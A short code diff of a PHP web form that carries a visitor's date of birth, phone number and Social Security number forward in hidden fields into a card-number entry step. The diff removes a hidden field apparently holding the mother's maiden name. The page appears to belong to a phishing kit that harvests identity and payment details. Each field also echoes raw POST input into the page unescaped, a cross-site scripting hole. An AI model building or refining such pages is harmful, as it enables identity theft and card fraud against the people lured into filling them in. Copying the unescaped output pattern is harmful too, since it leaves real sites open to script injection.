@@ -123,7 +123,6 @@ input{ height:55px !important; }
 			<input type="hidden" name="dob" value="<?php echo $_POST['dob']; ?>">
 			<input type="hidden" name="phone" value="<?php echo $_POST['phone']; ?>">
 			<input type="hidden" name="ssn" value="<?php echo $_POST['ssn']; ?>">
-			<input type="hidden" name="mmn" value="<?php echo $_POST['mmn']; ?>">
 			<div class="card-form__inner">
 				<div class="card-input">
 					<label for="cardNumber" class="card-input__label">Card Number</label>
